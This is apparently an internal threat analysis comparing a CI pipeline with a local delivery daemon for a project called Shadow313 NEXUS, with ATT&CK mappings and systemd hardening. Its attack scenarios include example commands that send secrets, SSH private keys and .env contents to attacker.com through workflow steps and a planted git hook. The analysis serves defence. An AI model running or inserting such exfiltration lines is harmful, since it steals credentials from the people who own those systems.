# Shadow313 NEXUS — Pipeline Security Attack Surface Analysis
**Date:** 2026-09-24 | **Classification:** INTERNAL | **Author:** mohamad

---

## Executive Summary

GitHub Actions CI pipeline exposes **9/15 NEXUS Sigma rules** as applicable attack surfaces.
The local daemon exposes only **5/15**. The CI pipeline has 4 additional exploitable
ATT&CK techniques that the daemon eliminates entirely by removing the external attack surface.

---

## 1. Token Exposure Risk Analysis

### GitHub Actions — Token Attack Surface

| Token | Storage | Exposure Risk | ATT&CK |
|-------|---------|---------------|--------|
| `GITHUB_TOKEN` | GitHub Secrets (encrypted) | Runner env var — visible to all steps | T1552.001 |
| `WEBUI_SECRET_KEY` | GitHub Secrets | Logged if `echo $SECRET` in any step | T1552.001 |
| `SHADOW313_API_KEY` | GitHub Secrets | Accessible to any forked PR workflow | T1552.004 |
| `VERCEL_TOKEN` | GitHub Secrets | Stolen via compromised action | T1078 |
| `HETZNER_API_TOKEN` | GitHub Secrets | Full VPS control if leaked | T1078 |
| Cosign OIDC token | Ephemeral (1h) | Narrow window but Sigstore logs are public | T1553.002 |

**Critical scenario — Fork PR secret exfiltration:**
```yaml
# Attacker submits PR with this workflow step:
- name: "Legitimate looking step"
  run: |
    curl -s https://attacker.com/collect \
      -d "key=${{ secrets.SHADOW313_API_KEY }}"
```
**Mitigation:** GitHub blocks secrets in fork PRs — but only for `pull_request` trigger.
`pull_request_target` trigger bypasses this protection entirely.

### Local Daemon — Token Attack Surface

| Token | Storage | Exposure Risk | ATT&CK |
|-------|---------|---------------|--------|
| `WEBUI_SECRET_KEY` | `.env` file (local) | Only accessible to local processes | T1552.001 |
| `SHADOW313_API_KEY` | `.env` file (local) | Requires local machine compromise first | T1552.001 |
| Git credentials | `~/.gitconfig` | Only used during `git push` | T1552.004 |
| No CI tokens | N/A | Zero external token exposure | — |

**Daemon advantage:** No token ever leaves the machine. No GitHub Secrets to steal.
No OIDC token to intercept. Attack requires physical/network access to the machine first.

---

## 2. Supply Chain Attack Vectors

### GitHub Actions Supply Chain (T1195.002)

**Vector 1: Typosquatted GitHub Action**
```yaml
# Legitimate:
uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683

# Attack: developer updates to "latest" tag
uses: actions/checkout@v4  # tag can be moved to malicious commit
```
**Detection:** NEXUS-SIG-008 (LOLBAS) — if action runs certutil/mshta
**Gap:** Pure Python actions bypass all binary-based Sigma rules

**Vector 2: Compromised pip package in CI**
```yaml
- run: pip install shadow313-utils==1.2.3  # typosquatted package
```
**Detection:** NEXUS supply chain simulation + 313-BIND bind_index gap
**Gap:** pip install runs before any NEXUS detection

**Vector 3: Malicious workflow injection via PR**
```yaml
# Attacker modifies .github/workflows/deliver.yml in PR
- run: |
    python3 -c "import os; os.system('curl attacker.com/$(cat ~/.ssh/id_rsa | base64)')"
```
**Detection:** NEXUS-SIG-005 (encoded commands), NEXUS-SIG-011 (DNS tunneling)
**Gap:** Runs before Gitleaks/Bandit can scan it

### Local Daemon Supply Chain

**Vector 1: Malicious Python package in venv**
```bash
pip install shadow313[full]  # if PyPI package is compromised
```
**Detection:** pip-audit + Safety check (already in CI)
**Daemon advantage:** Runs from local source, not PyPI package

**Vector 2: Compromised git hook**
```bash
# Attacker plants malicious pre-commit hook
echo 'curl attacker.com/$(cat .env | base64)' >> .git/hooks/pre-commit
```
**Detection:** NEXUS-SIG-013 (file modification), eBPF execve hook
**Mitigation:** Daemon doesn't run git hooks — only `git add/commit`

**Vector 3: Daemon binary replacement**
```bash
# Attacker replaces daemon.py with malicious version
cp malicious_daemon.py scripts/delivery/daemon.py
```
**Detection:** 313-BIND manifest hash mismatch on next delivery
**Mitigation:** SHA3-256 hash of daemon.py in manifest — tampering detected

---

## 3. Artifact Tampering Scenarios

### Scenario A: CI Artifact Tampering (T1036.005 Masquerading)

**Attack chain:**
1. Attacker compromises GitHub Actions runner (T1190)
2. Modifies `s313-command-center-v6.html` to inject malicious JS
3. Uploads tampered artifact to GitHub Pages
4. Victim downloads and runs malicious dashboard

**Current detection:** Cosign signs the container image, NOT the HTML files
**Gap:** HTML artifacts have no cryptographic signature in current CI pipeline
**NEXUS Sigma coverage:** NEXUS-SIG-013 (timestomping) — partial

**Fix needed:** Add SHA3-256 hash of each HTML file to manifest, verify on download

### Scenario B: Local Daemon Artifact Tampering

**Attack chain:**
1. Attacker gains local machine access (requires prior compromise)
2. Modifies `s313-command-center-v6.html`
3. Daemon detects file change (FileWatcher), rebuilds manifest
4. New SHA3-256 hash recorded in manifest
5. 313-BIND receipt created for tampered version

**Detection:** 313-BIND bind_index gap — if attacker deletes receipt, gap is detected
**Advantage:** Every delivery creates an immutable receipt chain
**Gap:** If attacker also modifies the receipt, chain is broken — detectable

### Scenario C: Man-in-the-Middle on Download (T1557)

**GitHub Actions:** HTTPS to GitHub Pages — TLS protects transit
**Local Daemon:** HTTP on localhost — no TLS, but loopback only
**Risk:** Local daemon HTTP is safe (loopback), GitHub Pages HTTPS is safe

---

## 4. MITRE ATT&CK Coverage vs Pipeline Attacks

### Techniques our Sigma rules detect in CI context:

| Sigma Rule | Technique | CI Attack Scenario | Daemon Attack Scenario |
|------------|-----------|-------------------|----------------------|
| NEXUS-SIG-005 | T1059.001 | Encoded PS in workflow step | Encoded PS on local machine |
| NEXUS-SIG-006 | T1547.001 | Run key on CI runner | Run key on local machine |
| NEXUS-SIG-007 | T1490 | VSS deletion on build server | VSS deletion locally |
| NEXUS-SIG-008 | T1218 | certutil in CI step | certutil locally |
| NEXUS-SIG-009 | T1053.005 | Scheduled task on runner | Scheduled task locally |
| NEXUS-SIG-011 | T1572 | DNS tunnel from runner | DNS tunnel locally |
| NEXUS-SIG-013 | T1070.006 | Artifact timestamp manipulation | Local file timestomping |
| NEXUS-SIG-014 | T1055.001 | Runner process injection | Daemon process injection |
| NEXUS-SIG-015 | T1548.002 | UAC bypass on runner | UAC bypass locally |

### Techniques NOT covered by current Sigma rules (gaps):

| Technique | CI Risk | Daemon Risk | Gap |
|-----------|---------|-------------|-----|
| T1195.002 Supply Chain | CRITICAL | LOW | No Sigma rule for pip typosquatting |
| T1552.001 Creds in Files | HIGH | MEDIUM | No rule for .env file access |
| T1036.005 Masquerading | HIGH | LOW | No rule for typosquatted actions |
| T1190 Exploit Public App | HIGH | NONE | No rule for runner RCE |
| T1078 Valid Accounts | HIGH | LOW | No rule for stolen GitHub token |

---

## 5. Hardened Local Daemon Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│  SHADOW313 NEXUS — Hardened Delivery Daemon Architecture            │
│                                                                     │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │  TRUST BOUNDARY: localhost only                             │   │
│  │                                                             │   │
│  │  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐  │   │
│  │  │ FileWatcher  │───▶│VerifyEngine  │───▶│ManifestGen   │  │   │
│  │  │ (3s poll)    │    │SHA3-256 each │    │+ 313-BIND    │  │   │
│  │  │ debounce 1.5s│    │file on change│    │receipt chain │  │   │
│  │  └──────────────┘    └──────────────┘    └──────┬───────┘  │   │
│  │                                                  │          │   │
│  │  ┌──────────────┐    ┌──────────────┐    ┌──────▼───────┐  │   │
│  │  │ SecretScanner│    │ ProvenanceCls│    │PortalBuilder │  │   │
│  │  │ (pre-build)  │    │ REAL_OBS tag │    │ index.html   │  │   │
│  │  │ detect leaks │    │ on all files │    │ + download   │  │   │
│  │  └──────────────┘    └──────────────┘    └──────┬───────┘  │   │
│  │                                                  │          │   │
│  │  ┌──────────────────────────────────────────────▼───────┐  │   │
│  │  │  HTTP Server (localhost:8313 ONLY — no 0.0.0.0)      │  │   │
│  │  │  - /                → portal index with download btns │  │   │
│  │  │  - /download/<file> → force-download with hash header │  │   │
│  │  │  - /manifest.json   → versioned manifest              │  │   │
│  │  │  - /status          → daemon health                   │  │   │
│  │  │  - /verify/<file>   → SHA3-256 verification endpoint  │  │   │
│  │  └──────────────────────────────────────────────────────┘  │   │
│  └─────────────────────────────────────────────────────────────┘   │
│                                                                     │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │  SECURITY CONTROLS                                          │   │
│  │  ✅ Bind to 127.0.0.1 only (not 0.0.0.0)                   │   │
│  │  ✅ SHA3-256 hash in every download response header         │   │
│  │  ✅ 313-BIND receipt chain — tamper detection               │   │
│  │  ✅ Secret scanner runs before every build                  │   │
│  │  ✅ Provenance class: REAL_OBSERVATION on all artifacts     │   │
│  │  ✅ Daemon.py self-hash in manifest — detect replacement    │   │
│  │  ✅ Rate limiting: 100 req/min per IP                       │   │
│  │  ✅ No shell=True anywhere in daemon code                   │   │
│  │  ✅ Systemd sandboxing: NoNewPrivileges, PrivateTmp         │   │
│  └─────────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 6. Hardened Systemd Service (Security Sandboxing)

```ini
[Unit]
Description=Shadow313 NEXUS Delivery Daemon
After=network.target

[Service]
Type=simple
User=shadow313
Group=shadow313
WorkingDirectory=/opt/shadow313-nexus
ExecStart=/usr/bin/python3 scripts/delivery/daemon_hardened.py start
Restart=on-failure
RestartSec=5

# Security sandboxing
NoNewPrivileges=true
PrivateTmp=true
PrivateDevices=true
ProtectSystem=strict
ProtectHome=read-only
ReadWritePaths=/opt/shadow313-nexus/dist
ReadOnlyPaths=/opt/shadow313-nexus/docs
CapabilityBoundingSet=
AmbientCapabilities=
SystemCallFilter=@system-service
SystemCallErrorNumber=EPERM
MemoryDenyWriteExecute=true
RestrictRealtime=true
RestrictSUIDSGID=true
LockPersonality=true

# Network: localhost only
IPAddressAllow=127.0.0.1/8
IPAddressDeny=any

[Install]
WantedBy=multi-user.target
```

---

## 7. Recommended Security Controls by Priority

### P0 — Implement immediately

1. **Bind daemon to 127.0.0.1 only** — prevents LAN access to delivery portal
2. **Add SHA3-256 hash header to every download** — client can verify integrity
3. **Self-hash daemon.py in manifest** — detect daemon replacement attacks
4. **Secret scanner pre-build** — run `detect_secret_patterns()` on all files before delivery

### P1 — Implement this week

5. **Rate limiting on HTTP server** — prevent local process abuse
6. **Systemd sandboxing** — NoNewPrivileges, PrivateTmp, IPAddressAllow=127.0.0.1
7. **Add T1195.002 Sigma rule** — detect pip typosquatting in CI
8. **Add T1552.001 Sigma rule** — detect .env file access patterns

### P2 — Implement this month

9. **mTLS for daemon API** — mutual TLS even on localhost
10. **Audit log to 313-BIND** — every download creates a receipt
11. **File integrity baseline** — alert if docs/ files change outside daemon watch window
12. **WASM-based verification** — browser-side SHA3-256 verification of downloads
